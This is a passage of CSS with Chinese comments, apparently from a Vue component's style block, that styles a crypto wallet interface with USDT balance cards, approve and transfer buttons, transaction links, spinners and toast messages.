  transition: background 0.2s;
  position: relative;
}

.copy-btn:hover {
  background: #e0e0e0;
}

.copy-icon {
  font-size: 1.1rem;
}

.copy-toast {
  position: absolute;
  right: 100%;
  top: 50%;
  transform: translateY(-50%);
  margin-right: 8px;
  padding: 4px 8px;
  border-radius: 4px;
  background: #1a237e;
  color: white;
  font-size: 0.75rem;
  white-space: nowrap;
}

/* 操作按钮 */
.action-btn {
  width: 100%;
  padding: 14px 20px;
  border-radius: 12px;
  border: none;
  font-size: 0.95rem;
  font-weight: 500;
  cursor: pointer;
  transition: all 0.2s;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
}

.action-btn--approve {
  background: linear-gradient(135deg, #7b1fa2 0%, #6a1b9a 100%);
  color: white;
}

.action-btn--approve:hover:not(:disabled) {
  background: linear-gradient(135deg, #6a1b9a 0%, #5a188a 100%);
}

.action-btn--transfer {
  background: linear-gradient(135deg, #0d47a1 0%, #093884 100%);
  color: white;
}

.action-btn--transfer:hover:not(:disabled) {
  background: linear-gradient(135deg, #093884 0%, #072f6b 100%);
}

.action-btn:disabled {
  opacity: 0.7;
  cursor: not-allowed;
}

/* 交易结果 */
.tx-result {
  margin-top: 20px;
  padding: 16px;
  border-radius: 12px;
  background: #f0f7ff;
  color: #0d47a1;
}

.tx-result__title {
  font-size: 0.95rem;
  font-weight: 500;
  margin-bottom: 8px;
}

.tx-hash-link {
  display: block;
  font-size: 0.85rem;
  font-family: 'SFMono-Regular', monospace;
  color: #0d47a1;
  text-decoration: none;
  word-break: break-all;
  transition: color 0.2s;
}

.tx-hash-link:hover {
  color: #072f6b;
  text-decoration: underline;
}

/* 加载动画 */
.loading-spinner {
  width: 18px;
  height: 18px;
  border: 2px solid rgba(255, 255, 255, 0.3);
  border-radius: 50%;
  border-top-color: white;
  animation: spin 1s linear infinite;
}

.small-spinner {
  width: 14px;
  height: 14px;
  border-color: rgba(102, 102, 102, 0.3);
  border-top-color: #666;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}

/* 全局提示框 */
.global-toast {
  position: fixed;
  bottom: 20px;
  left: 50%;
  transform: translateX(-50%);
  max-width: 90%;
  padding: 14px 20px;
  border-radius: 12px;
  background: #c62828;
  color: white;
  font-size: 0.9rem;
  display: flex;
  align-items: center;
  gap: 12px;
  z-index: 1000;
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.15);
}

.global-toast.success {
  background: #2e7d32;
}

.global-toast.info {
  background: #0d47a1;
}

.toast-icon {
  font-size: 1.1rem;
}

.toast-text {
  flex: 1;
  max-width: 300px;
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

.toast-close {
  background: transparent;
  border: none;
  color: white;
  font-size: 1.2rem;
  cursor: pointer;
  padding: 0 4px;
}

/* 桌面端适配（屏幕≥768px） */
@media (min-width: 768px) {
  .app-header {
    padding: 20px 0;
  }

  .app-title {
    font-size: 1.75rem;
    margin-bottom: 0;
    text-align: left;
  }

  .chain-select-container {
    justify-content: flex-end;
  }

  .connect-methods {
    flex-direction: row;
    gap: 16px;
  }

  .connect-btn {
    flex: 1;
  }

  .mobile-connect-group {
    flex-direction: row;
    align-items: center;
    gap: 12px;
  }

  .mobile-connect-label {
    padding-left: 0;
  }

  .mobile-wallet-select {
    flex: 1;
    max-width: 200px;
  }

  .address-card__body {
    flex-direction: row;
    justify-content: space-between;
    align-items: center;
  }

  .usdt-card-group {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 24px;
  }

  .balance-card {
    grid-column: 1 / -1;
  }

  .balance-card__body {
    padding: 40px 24px;
  }

  .balance-value {
    font-size: 3rem;
  }

  .global-toast {
    top: 20px;
    bottom: auto;
    max-width: 400px;
    transform: none;
    left: auto;
    right: 20px;
  }

  .toast-text {
    max-width: none;
    white-space: normal;
  }
}

/* 大屏适配（屏幕≥1024px） */
@media (min-width: 1024px) {
  .balance-value {
    font-size: 3.5rem;
  }
}
</style>